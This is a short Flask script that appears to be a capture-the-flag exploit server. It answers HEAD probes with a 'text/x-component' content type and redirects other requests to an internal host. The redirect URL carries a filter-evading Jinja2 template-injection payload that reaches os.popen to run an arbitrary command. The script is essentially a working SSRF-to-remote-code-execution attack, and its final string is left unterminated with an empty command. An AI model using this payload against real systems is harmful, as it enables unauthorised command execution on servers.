from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect("http://0.0.0.0:3000/home?token=f758a3bbb81184b37b8fba12335d43b0&directory={%with output=((((request|attr('application'))|attr(request|attr(\"args\")|attr(\"get\")('globals')))|attr(request|attr(\"args\")|attr("get")('getitem')))(request|attr(\"args\")|attr(\"get\")('builtins'))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('import'))('os')|attr('popen')(request|attr(\"args\")|attr(\"get\")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=
)
